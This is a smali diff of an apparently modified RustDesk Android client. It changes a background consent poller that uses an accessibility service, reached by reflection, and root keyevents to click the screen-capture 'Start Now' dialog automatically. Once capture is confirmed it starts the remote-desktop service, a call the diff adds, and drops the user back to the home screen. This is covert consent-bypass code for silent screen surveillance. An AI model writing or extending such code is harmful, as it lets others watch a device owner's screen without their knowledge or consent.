@@ -21,7 +21,7 @@
 .method constructor <init>()V
     .registers 1
 
-    .line 525
+    .line 541
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
     return-void
@@ -32,17 +32,17 @@
 .method public run()V
     .registers 16
 
-    .line 528
+    .line 544
     invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
 
     move-result-wide v0
 
-    .line 529
+    .line 545
     const/4 v2, 0x0
 
     const/4 v3, 0x0
 
-    .line 530
+    .line 546
     :goto_6
     invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
 
@@ -54,37 +54,37 @@
 
     cmp-long v8, v4, v6
 
-    if-gez v8, :cond_b6
+    if-gez v8, :cond_b9
 
-    .line 531
+    .line 547
     const/4 v4, 0x1
 
     add-int/2addr v3, v4
 
-    .line 533
+    .line 549
     const-wide/16 v5, 0x12c
 
     :try_start_15
     invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V
 
-    .line 536
+    .line 552
     const-string v5, "com.carriez.flutter_hbb.InputService"
 
     invoke-static {v5}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
 
     move-result-object v5
 
-    .line 537
+    .line 553
     const-string v6, "z"
 
     invoke-virtual {v5, v6}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
 
     move-result-object v5
 
-    .line 538
+    .line 554
     invoke-virtual {v5, v4}, Ljava/lang/reflect/Field;->setAccessible(Z)V
 
-    .line 539
+    .line 555
     const/4 v6, 0x0
 
     invoke-virtual {v5, v6}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
@@ -93,22 +93,22 @@
 
     check-cast v5, Landroid/accessibilityservice/AccessibilityService;
     :try_end_2e
-    .catchall {:try_start_15 .. :try_end_2e} :catchall_b3
+    .catchall {:try_start_15 .. :try_end_2e} :catchall_b6
 
-    .line 540
+    .line 556
     const-wide/16 v6, 0x190
 
     const-string v8, "AutoConsentHelper"
 
     if-eqz v5, :cond_4c
 
-    .line 541
+    .line 557
     :try_start_34
     invoke-virtual {v5}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
 
     move-result-object v5
 
-    .line 542
+    .line 558
     if-eqz v5, :cond_4c
 
     invoke-static {v5}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->searchAndClickConsent(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
@@ -117,23 +117,23 @@
 
     if-eqz v5, :cond_4c
 
-    .line 543
+    .line 559
     const-string v4, "Consent poller successfully clicked Start Now button via Accessibility!"
 
     invoke-static {v8, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
 
-    .line 544
+    .line 560
     invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
 
-    .line 545
+    .line 561
     invoke-static {}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->returnToHomeLauncher()V
     :try_end_4b
-    .catchall {:try_start_34 .. :try_end_4b} :catchall_b3
+    .catchall {:try_start_34 .. :try_end_4b} :catchall_b6
 
-    .line 546
-    goto :goto_b6
+    .line 562
+    goto :goto_b9
 
-    .line 551
+    .line 567
     :cond_4c
     const/4 v5, 0x4
 
@@ -150,11 +150,11 @@
     :try_start_55
     rem-int/lit8 v5, v3, 0x3
     :try_end_57
-    .catchall {:try_start_55 .. :try_end_57} :catchall_b3
+    .catchall {:try_start_55 .. :try_end_57} :catchall_b6
 
     if-nez v5, :cond_72
 
-    .line 553
+    .line 569
     :try_start_59
     invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
 
@@ -172,7 +172,7 @@
 
     invoke-virtual {v5, v13}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
 
-    .line 557
+    .line 573
     const-string v5, "Consent poller dispatched root DPAD/Enter keyevent for Start Now dialog."
 
     invoke-static {v8, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
@@ -181,14 +181,14 @@
 
     goto :goto_71
 
-    .line 558
+    .line 574
     :catchall_70
     move-exception v5
 
     :goto_71
     nop
 
-    .line 563
+    .line 579
     :cond_72
     :try_start_72
     invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
@@ -209,7 +209,7 @@
 
     move-result-object v4
 
-    .line 566
+    .line 582
     new-instance v5, Ljava/io/BufferedReader;
 
     new-instance v9, Ljava/io/InputStreamReader;
@@ -224,16 +224,16 @@
 
     invoke-direct {v5, v9}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
 
-    .line 567
+    .line 583
     invoke-virtual {v5}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
 
     move-result-object v4
 
-    .line 568
+    .line 584
     invoke-virtual {v5}, Ljava/io/BufferedReader;->close()V
 
-    .line 569
-    if-eqz v4, :cond_b2
+    .line 585
+    if-eqz v4, :cond_b5
 
     const-string v5, "TYPE_SCREEN_CAPTURE"
 
@@ -241,40 +241,43 @@
 
     move-result v4
 
-    if-eqz v4, :cond_b2
+    if-eqz v4, :cond_b5
 
-    .line 570
+    .line 586
     const-string v4, "MediaProjection confirmed active! Returning to home launcher..."
 
     invoke-static {v8, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
 
-    .line 571
+    .line 587
+    invoke-static {}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->ensureRustDeskServiceStarted()V
+
+    .line 588
     invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
 
-    .line 572
+    .line 589
     invoke-static {}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->returnToHomeLauncher()V
-    :try_end_b0
-    .catchall {:try_start_72 .. :try_end_b0} :catchall_b1
+    :try_end_b3
+    .catchall {:try_start_72 .. :try_end_b3} :catchall_b4
 
-    .line 573
-    goto :goto_b6
+    .line 590
+    goto :goto_b9
 
-    .line 575
-    :catchall_b1
+    .line 592
+    :catchall_b4
     move-exception v4
 
-    :cond_b2
-    goto :goto_b4
+    :cond_b5
+    goto :goto_b7
 
-    .line 577
-    :catchall_b3
+    .line 594
+    :catchall_b6
     move-exception v4
 
-    :goto_b4
+    :goto_b7
     goto/16 :goto_6
 
-    .line 579
-    :cond_b6
-    :goto_b6
+    .line 596
+    :cond_b9
+    :goto_b9
     return-void
 .end method
